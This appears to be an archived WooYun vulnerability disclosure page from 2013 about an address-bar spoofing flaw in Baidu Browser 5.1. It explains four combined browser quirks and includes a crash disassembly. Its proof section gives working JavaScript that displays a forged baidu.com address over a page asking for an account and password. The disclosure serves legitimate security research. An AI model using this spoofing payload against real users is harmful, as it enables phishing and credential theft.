@@ -1,0 +1,231 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		百度浏览器5.1正式版（2.210.0.42889）data协议伪造任意网站漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		百度浏览器5.1正式版（2.210.0.42889）data协议伪造任意网站漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/blast">blast</a> 
+</li><li>提交时间：		2013-11-01 08:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-04：	厂商主动忽略漏洞，细节向第三方安全合作伙伴开放<br/>
+									2014-01-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">百度浏览器data协议和脚本处理等4个地方有问题，可以伪造任意网站。 偶尔会因为堆访问出错程序崩溃，测试了二十多次只出现了一次。 <br />
+ps：非之前的坑爹脚本，但是之前的那种spoof百度还是没修复。。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题由这些因素综合而来<br />
+<br />
+1、百度处理网页的时候有一个蛋疼的设定：如果网页里面有一个iframe的网址无法打开，那么百度浏览器会把整个页面的地址都给替换成出错的网址，但是此时页面的地址并不是出错的那个，而是data:text/html,biduwebdata，也就是显示错误信息；由于这个data:协议非常容易伪造，给了这个脚本可乘之机；<br />
+<br />
+2、百度浏览器处理脚本死循环的时候不会退出或者提示终止，而是让整个页面卡着不动，例如&lt;script&gt;while(1){}&lt;/script&gt;或者&lt;script&gt;while(1){alert(3)}&lt;/script&gt;,前者让浏览器页面卡住，但是内容照常显示，后者一直弹出对话框，程序只能通过任务管理器禁止，<br />
+<br />
+3、百度浏览器当脚本执行超过5s的时候不会显示加载的小圆圈。<br />
+<br />
+4、百度浏览器能识别http:\www.baidu.com，http:/\www.baidu.com等等网址，而且由于之前的栈溢出（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-036295">WooYun: 百度浏览器5.0正式版(2.200.0.41563)拒绝服务漏洞</a> ）毛病改了个新法子：网址超过4000多字（忘了。。刚才崩溃的时候看到分配的好像是这么多）的时候直接显示无法连接<br />
+<br />
+<br />
+<br />
+组合这4个问题：<br />
+<br />
+1、利用location.href将自己的地址替换成data:text/html,xxx形式，然后打开一个data:text/html,xxx2的新窗口<br />
+<br />
+2、可以在xxx2中写入一个超长地址，而且是http:\\www.baidu.com/xxx这种的iframe，同时让它转换转换<br />
+<br />
+3、根据特性【4】，xxx2出错，同时根据特性【1】，xxx2显示的网址变为了http://www.baidu.com/xxxxx，xxx2的location.href变为了data:text/html,biduwebdata，也就是显示的是http://，但是协议依然是data:。<br />
+<br />
+4、根据同源原理，xxx1此时可以写入xxx2，此时修改xxx2内容并加入一个死循环，由于百度的特性【2】，百度不会再试图向xxx2写入自己的报错数据，或者说没机会写入，然后由于【3】的原因，几秒后，就可以spoof一个“加载完成”的页面了<br />
+<br />
+<br />
+<br />
+ps：地址短于10000的话，还会显示百度认证图标-,-<br />
+<br />
+<br />
+<br />
+偶尔崩溃的情况<br />
+<br />
+</p><pre><code>CPU Disasm<br />
+Address   Hex dump          Command                                  Comments<br />
+00167B10  /$  51            PUSH ECX<br />
+00167B11  |.  8D4C24 04     LEA ECX,[ESP+4]<br />
+00167B15  |.  2BC8          SUB ECX,EAX<br />
+00167B17  |.  1BC0          SBB EAX,EAX<br />
+00167B19  |.  F7D0          NOT EAX<br />
+00167B1B  |.  23C8          AND ECX,EAX<br />
+00167B1D  |.  8BC4          MOV EAX,ESP<br />
+00167B1F  |.  25 00F0FFFF   AND EAX,FFFFF000<br />
+00167B24  |&gt;  3BC8          /CMP ECX,EAX<br />
+00167B26  |.- 72 0A         |JB SHORT 00167B32<br />
+00167B28  |.  8BC1          |MOV EAX,ECX<br />
+00167B2A  |.  59            |POP ECX<br />
+00167B2B  |.  94            |XCHG EAX,ESP<br />
+00167B2C  |.  8B00          |MOV EAX,DWORD PTR DS:[EAX]<br />
+00167B2E  |.  890424        |MOV DWORD PTR SS:[ESP],EAX<br />
+00167B31  |.  C3            |RETN<br />
+00167B32  |&gt;  2D 00100000   |SUB EAX,1000 ;堆起始地址为0x00531000，减去0x1000之后的0x00530000处不可读<br />
+00167B37  |.  8500          |TEST DWORD PTR DS:[EAX],EAX             ; eax==530000; access violation，程序崩溃<br />
+00167B39  \.- EB E9         \JMP SHORT 00167B24</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;script&gt;<br />
+<br />
+location.href=&quot;data:text/html,&lt;scr&quot;+&quot;ipt&gt;var k=window.open(\&quot;data:text/html,123\&quot;,\&quot;newwin\&quot;);k.document.open();var i=1;var x=\&#039;a\&#039;;for(i=1;i&lt;23333;i++)x+=\&#039;a\&#039;;k.document.write(&#039;&lt;p&gt;you have got the 1st prize, send me your account and password to BLAST...&lt;/p&gt;&lt;iframe src=\&quot;http:\\\\\\\\baidu.com/A&#039;+x+&#039;\&quot;/&gt;&#039;);k.document.close();function aa(){k.document.open();k.document.write(&#039;&lt;title&gt;HELLO!!&lt;/title&gt;&lt;scr&#039;+&#039;ipt&gt;while(true){}&lt;/scr&#039;+&#039;ipt&gt;&#039;)}setTimeout(&#039;aa()&#039;,500)&lt;/scr&quot;+&quot;ipt&gt;&lt;a href=&#039;javascript:aa()&#039;&gt;xasxa&lt;/a&gt;&quot;;<br />
+<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ps：如果运行不了请联系我<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/01000203d3fa031a1db2c7cdb473015e1683cc79.png" target="_blank"><img src="../images/01000203d3fa031a1db2c7cdb473015e1683cc79.png" alt="f1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/010002209a567ad467f96e7f261a2f3073be63b2.png" target="_blank"><img src="../images/010002209a567ad467f96e7f261a2f3073be63b2.png" alt="f2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复上面几个问题 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/blast" title="blast">blast</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041641" title="百度浏览器5.1正式版（2.210.0.42889）data协议伪造任意网站漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-11-04 10:08</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">此问题在预览版中已修复，感谢提交。</p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41641";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
